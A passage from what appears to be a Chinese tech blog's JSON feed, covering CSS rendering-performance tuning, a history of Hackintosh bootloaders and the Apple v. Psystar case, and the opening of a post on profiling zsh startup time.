的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\">\n<div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-03</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\">\n<div class=\"license-title\">黑苹果的历史</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-09-02</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  